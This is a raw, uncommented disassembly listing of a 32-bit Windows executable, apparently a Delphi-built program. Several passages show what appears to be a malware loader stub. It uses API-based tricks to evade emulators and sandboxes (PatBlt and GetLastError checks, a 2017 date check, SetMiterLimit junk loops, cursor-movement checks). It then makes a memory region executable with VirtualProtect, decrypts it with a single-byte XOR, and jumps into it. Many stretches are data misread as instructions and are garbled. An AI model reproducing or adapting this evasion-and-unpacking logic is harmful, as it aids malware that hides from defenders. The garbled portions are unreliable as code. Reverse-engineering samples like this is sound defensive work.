mov edx [ esi ]
call sub_412ea0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
jmp r-xdata
cmp [ ebx + 0xa2 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
lea eax [ ebp - 0x28 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405a10
mov ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
jmp r-xdata
cmp [ ebx + 0x52 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
jmp r-xdata
sub_470dc8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039a0#2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xd0 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470e2b
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46ed48
lea eax [ ebx + 0xd0 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_405a10
sub_470e2f
add [ ecx + 0x630 ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebx
mov ebx eax
cmp [ ebx + 0xd0 ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xd0 ]
mov eax ebx
call sub_46ed64
lea eax [ ebx + 0xd0 ]
call sub_4059cc
sub_470e68
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46eb24
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_470ea0
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46eb78
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_470ec8
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039a0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edx 0xf009
jg r-xdata
cmp edx 0xf466
jg r-xdata
je r-xdata
sub edx 0xf467
je r-xdata
je r-xdata
cmp [ ebx + 0x7a ] 0x0
je r-xdata
cmp edx 0xf004
jg r-xdata
cmp [ ebx + 0x92 ] 0x0
je r-xdata
dec edx
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
sub edx 0xf00a
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4712c5
lea eax [ ebp - 0x2c ]
call sub_4059cc
lea eax [ ebp - 0x28 ]
mov edx [ r-xdata ]
mov ecx 0x3
call sub_404a50
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a50
lea eax [ ebp - 0x14 ]
call sub_4046a8
lea eax [ ebp - 0x10 ]
call sub_4059cc
lea eax [ ebp - 0xc ]
call sub_4046a8
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a50
retn
lea eax [ ebp - 0x14 ]
mov edx [ esi ]
call sub_412ea0
mov ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
jmp r-xdata
sub edx 0xf005
je r-xdata
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx [ esi ]
call sub_413544
mov ecx [ ebp - 0x1c ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
jmp r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
sub edx 0x60d
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ esi ]
call sub_413544
mov ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
cmp [ ebx + 0xaa ] 0x0
je r-xdata
dec edx
je r-xdata
cmp [ ebx + 0x9a ] 0x0
je r-xdata
dec edx
je r-xdata
cmp [ ebx + 0x72 ] 0x0
je r-xdata
sub edx 0xffffffff
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ esi ]
call sub_413544
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
jmp r-xdata
cmp [ ebx + 0xca ] 0x0
je r-xdata
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
jmp r-xdata
cmp [ ebx + 0xb2 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
jmp r-xdata
cmp [ ebx + 0x5a ] 0x0
je r-xdata
sub edx 0x2
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
jmp r-xdata
sub edx 0xf002
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
lea eax [ ebp - 0x2c ]
mov edx [ esi ]
call sub_413544
mov ecx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
lea eax [ ebp - 0x20 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405a10
mov ecx [ ebp - 0x20 ]
mov edx ebx
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
jmp r-xdata
cmp [ ebx + 0xba ] 0x0
je r-xdata
dec edx
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ esi ]
add edx 0x10
call sub_413544
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x28 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx [ esi ]
call sub_413544
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
jmp r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebx + 0x82 ] 0x0
je r-xdata
dec edx
je r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405a10
mov ecx [ ebp - 0x24 ]
mov edx ebx
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
jmp r-xdata
cmp [ ebx + 0xc2 ] 0x0
je r-xdata
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_412ea0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
jmp r-xdata
cmp [ ebx + 0xa2 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
lea eax [ ebp - 0x28 ]
mov edx [ esi ]
mov edx [ edx + 0x8 ]
mov ecx r-xdata
call sub_405a10
mov ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
jmp r-xdata
cmp [ ebx + 0x52 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
jmp r-xdata
sub_4712cb
add [ edi ] al
xor [ esi ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4039a0#7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471308
retn
sub_471318
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ 0x14540047 ] 0x47
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x2c004715 ] bh
add eax [ eax ]
add al ah
pop ebx
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax - 0x6d ] dh
inc ebp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax + 0x64 ]
xchg ebp eax
inc ebp
add [ eax ] dh
xchg esp eax
inc ebp
add [ eax + 0x4 ] bl
inc esp
add ah bl
xchg ebp eax
inc ebp
add [ edi + ecx * 4 - 0x5823ffbb ] cl
inc ecx
add ah bl
mov eax [ ebp ]
sbb [ ebp + eax * 2 + 0x458d2400 ] cl
add [ ecx + eax + 0x3600044 ] ch
inc edx
add [ ebp + edx * 4 + r--data ] bl
inc edx
add [ ecx + edx * 8 ] bh
inc ebp
add [ esi + eax * 4 + 0x45 ] dh
add [ eax ] dl
jb r-xdata
popad
add [ eax + ebp * 2 ] bh
inc esp
add ah ah
leave
inc ebp
add [ eax + 0x7f ] ch
inc ebp
add [ eax ] bl
add [ ebp ] 0xc4
mov edx 0x8b000045
inc ebp
add [ ebx + ecx * 4 + 0x45 ] bh
add ah al
int 0x45
add [ eax ] bh
mov [ ebp ] al
enter 0x45c8 0x0
test al 0xaf
inc ebp
add [ edx + ecx * 8 + 0x45 ] bh
add [ eax - 0x6b ] ah
inc ebp
add [ 0x47154400 ] cl
add al bh
add al [ eax ]
add [ eax ] al
add [ ebx ] cl
push ebx
je r-xdata
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
outsd
inc edi
jb r-xdata
arpl [ ebp + 0x78 ] dx
je r-xdata
add eax [ eax ]
add [ edi ] al
je r-xdata
sub al 0x3
add [ eax ] al
loopne r-xdata
inc ebp
insd
jne r-xdata
inc ebx
push 0x426b6365
cld
add al [ eax ]
add [ ecx ] al
add [ edx ] cl
push eax
outsd
jo r-xdata
inc ebx
add [ eax + 0x1c004337 ] cl
sbb al [ ebx ]
shl bh 0x1
inc edx
add [ eax + 0x40 ] cl
arpl [ ecx + ecx * 2 + 0x74 ] si
insd
jbe r-xdata
inc ebp
add [ eax + 0x3 ] cl
inc edx
add [ eax ] al
mov [ ebp ] al
mov ah 0x89
inc ebp
add [ eax + 0x20004034 ] ch
scasb [ edi ]
inc ebp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + ecx * 4 ] bl
inc ebp
add ah bh
jbe r-xdata
lodsb [ esi ]
inc edi
add [ ebx ] dh
rcl [ ebp + 0x68 ] 0x45
sbb [ edi ] al
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor [ eax + 0x13 ] esp
inc edi
add [ eax ] ch
pop ebp
inc ebp
add [ eax - 0xc ] ah
inc esp
add [ ebx + ebp + 0x43 ] dh
add al bl
and al [ ebx ]
dec eax
inc eax
add [ eax + 0x54 ] dl
inc ebx
xor [ eax ] ebx
add eax [ eax ]
add [ eax ] cl
add [ ebx ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x31c31
add [ ecx ] cl
add [ ebx + eax * 2 ] cl
or al 0x3
add [ eax ] al
add eax 0x75420700
je r-xdata
outsd
outsb
je r-xdata
or [ eax ] eax
or al 0x43
jo r-xdata
insd
outsd
outsd
imul eax [ ecx + 0x70 ] 0x70
insb
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ ebp + eax * 4 + 0x45 ] dh
add [ eax + 0x4c00459c ] al
inc eax
inc esp
add [ ecx + ebp * 4 + 0x45 ] al
add [ esp + ebp * 4 - 0x549fffbb ] ah
inc ebp
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add ah bl
lodsd [ esi ]
inc ebp
add [ eax + 0x3f ] cl
inc esp
add al bh
imul eax [ eax + eax - 0x30 ] 0xffffffb4
inc ebp
add ah ch
jge r-xdata
add [ eax ] cl
test [ ebx ] sub_446c8c
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
nop
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call PatBlt
nop
call GetLastError
mov [ rw-data ] eax
nop
nop
cmp [ rw-data ] 0x6
je r-xdata
add [ eax + eax ] cl
imul ebp [ edi + 0x6e ] 0x32831
outsd
add [ ebx ] cl
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
add [ eax ] al
pop es
outsb
jne r-xdata
add [ ebx + 0x471580c0 ] cl
add [ edi ] al
push es
push esp
inc esi
outsd
jb r-xdata
test [ ecx ] al
inc edi
add [ eax + 0x6c0046f1 ] cl
adc al 0x46
push es
push esp
inc esi
nop
push rw-data
call GetLocalTime
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
call SetMiterLimit
jmp r-xdata
or eax 0x63656843
imul ecx [ ecx + ebp * 2 + 0x73 ] 0x74
inc edx
outsd
js r-xdata
or al 0x0
jne r-xdata
jne r-xdata
outsd
js r-xdata
add [ ebx ] al
add [ eax ] al
add al [ eax ]
add eax 0x74696445
xor [ ebx + eax ] eax
add [ eax ] al
add eax [ eax ]
push es
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ eax ] ecx
add eax [ eax ]
add [ eax + eax ] al
or [ ebx + 0x68 ] eax
arpl [ gs : ebx + 0x42 ] bp
xor [ ebx - 0x1374aa40 ] ecx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
insb
adc [ eax ] al
add eax 0x74696e55
xor [ 0x43545000 ] ecx
nop
mov ebx 0x22b4
jmp r-xdata
inc ebx
push 0x4c6b6365
imul esi [ ebx + 0x74 ] 0x31786f42
inc edx
outsd
js r-xdata
je r-xdata
je r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
call SetMiterLimit
nop
nop
nop
nop
dec ebx
jne r-xdata
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
je r-xdata
adc al 0x3
add [ esi ] bl
add eax 0x74696e55
xor [ eax ] eax
add [ ebx + 0x4715a0c0 ] cl
add [ ecx ] dl
add ch [ esi ]
xor al 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
add [ eax ] al
add [ eax + edx + 0x40 ] ch
add [ 0x74696e55 ] al
xor [ eax ] ebp
add eax [ eax ]
outsd
outsb
imul esp [ ebx + 0x61 ] 0x6e6f6974
outsb
xor [ eax ] edx
add eax [ eax ]
add [ esi ] al
add [ ecx ] cl
inc edi
jb r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
call SetMiterLimit
mov ebx 0x8e62
nop
nop
jmp r-xdata
outsd
jb r-xdata
je r-xdata
push 0x0
push 0x0
push 0x0
call SetMiterLimit
dec ebx
jne r-xdata
nop
push 0x0
push 0x0
push 0x0
call SetMiterLimit
nop
nop
nop
mov eax 0x1db8f040
call sub_4027b4
mov ecx eax
test ecx ecx
je r-xdata
add [ edi + edi * 4 ] dh
inc esp
add [ eax ] bl
stc
inc esi
add [ ecx + eax - 0xe77ffb9 ] al
inc esi
add [ esp + edx + 0x46 ] ch
sbb al 0x1a
inc ebx
add al dl
out 0x42 eax
xor [ eax ] esp
add eax [ eax ]
add [ edx ] cl
add [ 0x74736944 ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
xor [ ebx + eax ] esp
add [ eax ] al
or eax [ eax ]
adc ecx [ edi + 0x75 ]
je r-xdata
insd
mov ebx 0x1
mov edi 0xa8
xor edx edx
div edi
cmp edx 0xff
jbe r-xdata
call sub_40318c
mov eax ecx
add eax [ esi ]
jae r-xdata
call sub_403184
mov [ eax ] dl
inc ebx
cmp ebx 0x1db8d125
jne r-xdata
call sub_40318c
nop
mov [ esi ] ebx
nop
mov eax [ esi ]
add eax 0x1
jae r-xdata
mov eax ecx
call sub_4027d4
nop
nop
mov ebx 0x8b49
push 0x0
push 0x0
push 0x0
call SetMiterLimit
dec ebx
jne r-xdata
nop
nop
xor ebx ebx
nop
nop
push rw-data
call GetCursorPos
cmp eax 0x20
jbe r-xdata
call sub_40318c
nop
nop
push 0x0
push 0xb
call SleepEx
nop
cmp ebx 0x6
jbe r-xdata
nop
nop
add ebx 0x1
jae r-xdata
push rw-data
call GetCursorPos
mov eax [ rw-data ]
sub eax [ rw-data ]
jno r-xdata
nop
nop
mov eax rw-data
mov edx rw-data
mov ecx [ r-xdata ]
call sub_40535c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
call sub_40318c
nop
push esi
push 0x40
push 0x5873
mov eax [ rw-data ]
push eax
call VirtualProtect
nop
nop
xor ebx ebx
nop
nop
jmp r-xdata
mov al [ eax ]
nop
nop
xor al 0xad
mov edx [ rw-data ]
add edx [ esi ]
jae r-xdata
call sub_40318c
mov [ edx ] al
nop
nop
inc ebx
cmp ebx 0x5874
jne r-xdata
call sub_40318c
nop
mov [ esi ] ebx
mov eax [ rw-data ]
add eax [ esi ]
jae r-xdata
nop
nop
mov ebx 0x1674
nop
mov eax [ rw-data ]
add eax ebx
jae r-xdata
mov [ esi ] eax
nop
nop
jmp [ rw-data ]
call sub_40318c
sub_4715ea
mov eax eax
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi rw-data
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
nop
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call PatBlt
nop
call GetLastError
mov [ rw-data ] eax
nop
nop
cmp [ rw-data ] 0x6
je r-xdata
nop
push rw-data
call GetLocalTime
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
call SetMiterLimit
jmp r-xdata
nop
mov ebx 0x22b4
jmp r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
call SetMiterLimit
nop
nop
nop
nop
dec ebx
jne r-xdata
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
call SetMiterLimit
mov ebx 0x8e62
nop
nop
jmp r-xdata
push 0x0
push 0x0
push 0x0
call SetMiterLimit
dec ebx
jne r-xdata
nop
push 0x0
push 0x0
push 0x0
call SetMiterLimit
nop
nop
nop
mov eax 0x1db8f040
call sub_4027b4
mov ecx eax
test ecx ecx
je r-xdata
mov ebx 0x1
mov edi 0xa8
xor edx edx
div edi
cmp edx 0xff
jbe r-xdata
call sub_40318c
mov eax ecx
add eax [ esi ]
jae r-xdata
call sub_403184
mov [ eax ] dl
inc ebx
cmp ebx 0x1db8d125
jne r-xdata
call sub_40318c
nop
mov [ esi ] ebx
nop
mov eax [ esi ]
add eax 0x1
jae r-xdata
mov eax ecx
call sub_4027d4
nop
nop
mov ebx 0x8b49
push 0x0
push 0x0
push 0x0
call SetMiterLimit
dec ebx
jne r-xdata
nop
nop
xor ebx ebx
nop
nop
push rw-data
call GetCursorPos
cmp eax 0x20
jbe r-xdata
call sub_40318c
nop
nop
push 0x0
push 0xb
call SleepEx
nop
cmp ebx 0x6
jbe r-xdata
nop
nop
add ebx 0x1
jae r-xdata
push rw-data
call GetCursorPos
mov eax [ rw-data ]
sub eax [ rw-data ]
jno r-xdata
nop
nop
mov eax rw-data
mov edx rw-data
mov ecx [ r-xdata ]
call sub_40535c
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
call sub_40318c
nop
push esi
push 0x40
push 0x5873
mov eax [ rw-data ]
push eax
call VirtualProtect
nop
nop
xor ebx ebx
nop
nop
jmp r-xdata
mov al [ eax ]
nop
nop
xor al 0xad
mov edx [ rw-data ]
add edx [ esi ]
jae r-xdata
call sub_40318c
mov [ edx ] al
nop
nop
inc ebx
cmp ebx 0x5874
jne r-xdata
call sub_40318c
nop
mov [ esi ] ebx
mov eax [ rw-data ]
add eax [ esi ]
jae r-xdata
nop
nop
mov ebx 0x1674
nop
mov eax [ rw-data ]
add eax ebx
jae r-xdata
mov [ esi ] eax
nop
nop
jmp [ rw-data ]
call sub_40318c
sub_4718a0
push ecx
add [ eax ] al
add [ eax - 0x27ffb8e8 ] ch
popad
inc eax
add [ eax - 0x33ffbf9f ] ch
pop edi
inc eax
add [ eax + 0x5f ] bh
inc eax
add [ eax + 0x62 ] dl
inc eax
add [ eax ] ah
bound eax [ eax ]
outsd
inc eax
add [ edi + ebp * 2 ] dh
inc eax
add [ edi + ebp * 2 + 0x6f6c0040 ] bl
inc eax
add [ eax + 0x58004177 ] cl
ja r-xdata
shl [ edi - 0x585fffbe ] 0x1
inc edx
add [ eax + eax * 8 + 0x42 ] bh
add [ eax + eax * 8 ] bh
inc edx
add [ eax + esi * 4 + 0x42 ] al
add ah ah
jb r-xdata
add [ eax + esi * 4 ] dl
inc edx
add ah al
test al 0x42
add [ eax + ebp * 4 + 0x12140042 ] dl
inc edx
add ah ah
adc [ edx ] eax
fsub [ ebx - 0x5cf7ffbe ]
inc edx
add al dl
call 0xffffffffe8e71992
inc esp
add [ eax + esi * 4 - 0x4fabffbe ] al
inc edx
add [ eax + 0x7c0042a7 ] ah
rol [ edx ] 0x3c
rol [ edx ] 0x44
mov al 0x42
add [ edx + esi * 2 - 0x263fffc0 ] dh
inc eax
add [ eax - 0x28 ] al
inc eax
add [ edx + 0x40 ] dl
add [ edx ] ah
inc eax
add [ edx + ebx * 2 + 0x5a1c0041 ] dl
inc ecx
add [ eax + 0x5c ] ch
inc ecx
add [ eax ] bh
pop esp
inc ecx
add [ eax + 0x74 ] dl
inc ecx
add [ eax ] al
je r-xdata
add [ edi + ecx * 2 ] dh
inc ebp
add ah al
dec esi
inc ebp
add [ ebp + eax * 8 - 0x3a73ffbe ] bh
inc edx
add [ edi + ecx * 8 + 0x42 ] ah
add [ eax ] dl
iretd
shr al 0x1
inc esp
add [ eax - 0x7bffbb18 ] ah
mov al 0x42
add [ eax + esi * 4 + 0x42 ] dl
add [ eax + 0x420e ] dh
push cs
inc edx
add [ eax ] bl
movsd [ edi ] [ esi ]
inc edx
add al ch
movsb [ edi ] [ esi ]
inc edx
add al dl
cmpsd [ esi ] [ edi ]
inc edx
sub_47198e
inc edx
add [ eax ] al
rol [ edx ] 0x1
rcl al 0x1
inc edx
add [ eax ] dh
or al 0x43
add [ eax ] al
or al 0x43
add al bl
sahf
inc ebx
add [ eax - 0x4bffbc62 ] ch
rol [ edx ] 0x84
rol [ edx ] 0xf8
rol [ edx ] 0xbc
rol [ edx ] 0x38
rol [ edx ] 0x1
or cl dl
inc edx
add [ eax - 0x2f ] dh
inc edx
add [ eax - 0x2f ] al
inc edx
add [ eax + 0x4c0042d7 ] ch
xlat
inc edx
add [ eax ] cl
or [ ebx ] al
rol [ edi ] 0x43
add al ch
iretd
sub_4719e2
inc edx
add [ eax - 0x33ffbd31 ] al
or al [ ebx ]
test [ edx ] cl
inc ebx
add [ ebx + ecx ] dh
inc ebx
add ah ch
or al [ ebx ]
or al 0xa
inc ebx
add ah dl
or [ ebx ] eax
or al [ fs : ebx ]
xor al 0xa
inc ebx
add [ ecx + ecx ] dh
inc ebx
add [ ecx + ecx ] al
inc ebx
add [ eax + ecx + 0x8700043 ] ch
inc ebx
add [ eax - 0x60 ] al
inc ebx
add [ eax ] dl
mov al [ 0xba00043 ]
inc ebx
add [ eax + 0xb ] dl
inc ebx
add al bh
or eax [ ebx ]
test al 0xb
inc ebx
add [ eax + 0x8 ] ch
inc ebx
add [ eax ] bh
or [ ebx ] al
mov al 0xd
inc ebx
add [ eax ] bh
or eax 0x18a40043
inc ebx
add [ eax + 0x18 ] ah
inc ebx
add [ esp + edi * 4 ] cl
inc esp
add [ ebx + edi * 4 - 0x2e37ffbc ] ah
inc esp
add [ eax + 0xc0044d1 ] bl
lodsd [ esi ]
inc ebx
add [ esp + ebp * 4 - 0x3befffbd ] dl
inc edx
add al ah
retn
sub_471a89
cmp eax 0x3d0c0046
inc esi
add [ eax ] cl
push esi
inc esi
add al bl
push ebp
inc esi
add [ eax ] ah
out dx al
inc esi
add al dh
in eax dx
inc esi
add [ ebp + edx * 2 + 0x552c0046 ] cl
inc esi
add [ eax ] ch
mov al [ esi ]
in al dx
mov [ esi ] eax
insb
out dx al
inc esi
add [ esi + ebp * 8 ] bh
inc esi
add [ ebx + ecx * 4 + 0x46 ] dh
add [ ebx + ecx * 4 + 0x46 ] al
add [ edi + ecx * 8 + 0x46 ] dh
add [ eax ] bh
iretd
sub_471ac6
inc esi
add [ ebx + ecx * 4 ] bl
inc esi
add ah ch
mov al [ esi ]
je r-xdata
add ah cl
adc eax [ esi ]
mov esp 0x8c00462b
sub eax [ esi ]
adc al 0x3e
inc esi
add ah ah
cmp eax 0x2c240046
inc esi
add ah dh
sub eax [ esi ]
inc esi
add [ eax ] bh
cdq
inc esi
add [ edx + ecx * 4 - 0x7583ffba ] ch
inc esi
add [ eax ] bh
aam 0x46
add ah bl
rol [ esi ] cl
hlt
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_4718a0
call sub_406164
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45fecc
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_45fee4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45ff64
call sub_403eac
sub_401202
call [ eax + 0x244483cc ]
add al 0xf8
jmp sub_405a78
sub_40120f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405aa0
sub_401314
jmp [ __import_lookup_table_1(user32:CharNextA) ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_401324
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_40133c
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_40134c
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_401354
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_40135c
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_401364
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_401384
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
sub_40139c
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_4013a4
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ __import_lookup_table_0(kernel32:WideCharToMultiByte) ]
sub_4013c4
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
sub_4013dc
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
InterlockedDecrement
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_4013f4
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_401404
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401428
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401448
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401450
